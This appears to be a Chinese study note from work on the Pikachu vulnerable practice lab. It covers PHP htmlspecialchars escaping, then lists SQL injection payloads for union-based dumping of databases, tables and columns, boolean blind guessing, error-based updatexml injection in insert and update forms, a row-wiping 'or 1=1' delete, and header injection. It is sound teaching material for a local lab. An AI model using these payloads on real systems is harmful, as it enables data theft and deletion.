xss之htmlspecialchars

htmlspecialchars()是PHP提供的一个对特殊字符进行转义的函数，它可以把预定义的字符转换为HTML实体
预定义的字符：

&转换为&amp

“转换为&quot

‘转换为&#039

<转换为&lt

>转换为&gt

语法：htmlspecialchars(string,flags,character-set,double_encode)

在此主要关注第二个参数： 

可选。规定如何处理引号、无效的编码以及使用哪种文档类型。
可用的引号类型：
ENT_COMPAT - 默认。仅编码双引号。
ENT_QUOTES - 编码双引号和单引号。
ENT_NOQUOTES - 不编码任何引号。

SQL注入

SQL注入大致流程

通过单双引号判断是否存在注入点
id=1'     id=1"
判断列数
id=1 order by 3 --+
判断回显位置
id=-1 union select 1,2,3 --+
获得版本号和当前数据库
id=-1 union select 1,version(),database() --+
获得所有数据库名
id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata--+
获得某数据库所有表名
id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='库名' --+
获得某表所有列名
id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='表名' --+
库名、表名推荐使用0x开头的十六进制数代替，避免引入单引号导致出错
获得当前数据库指定表的数据
id=-1 union select 1,2,group_concat(列名) from 表名 --+

布尔盲注
二分法猜解当前数据库
id=1' and ascii(mid(database(),1,1))>'115' --+  
二分法猜解所有数据库
id=1' and ascii(substr((select schema_name from information_schema.schemata limit 1,1),1,1)>150 --+
二分法猜解所有表
id=1' and ascii(substr((select table_name from information_schema.tables where table_schema='库名' limit 1,1),1,1)>150 --+
二分法猜解所有列
id=1' and ascii(substr((select column_name from information_schema.columns where table_name='表名'  limit 1,1),1,1)>150 --+
二分法猜解数据
id=1' and ascii(substr((select 列名 from 表名 limit 1,1),1,1)>150 --+

mid(a,b,c)        // 截取字符串一部分，即返回a中从b开始的c个字符(若c省略，则返回剩余文本)
left(a,b)         // 得到字符串左部指定个数的字符，即从左侧截取a的前b位
substr(a,b,c)     // 与mid()类似，从位置b开始，截取a字符串c位长度  
可使用python的ord('s')函数将字符s转换为ASCII码，chr()函数将ASCII码转换为字符

“insert/update”注入

在注册页面，用户和密码输入引号出现报错，考虑使用报错注入
大佬的博客：https://blog.csdn.net/silence1_/article/details/90812612
insert语句中可以使用or进行闭合
payload：username=1' or updatexml(1,concat(0x7e,database()),1) or '&password=1&submit=submit
成功回显当前数据库，改变datebase()为其它sql语句即可完成注入
update注入的操作与insert类似

“delete”注入

点击删除后抓包，发现是通过get传递参数id完成删除操作的
删库跑路 http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=1 or 1=1
payload：http://127.0.0.1/pikachu/vul/sqli/sqli_del.php?id=1 or updatexml(1,concat(0x7e,database()),1)

“http header”注入

抓包后进行测试号，UA头处存在注入点，后端未对前端传递的值做检测，导致insert操作时出现注入点，与前面两题报错注入方式类似，抓包后修改UA头即可
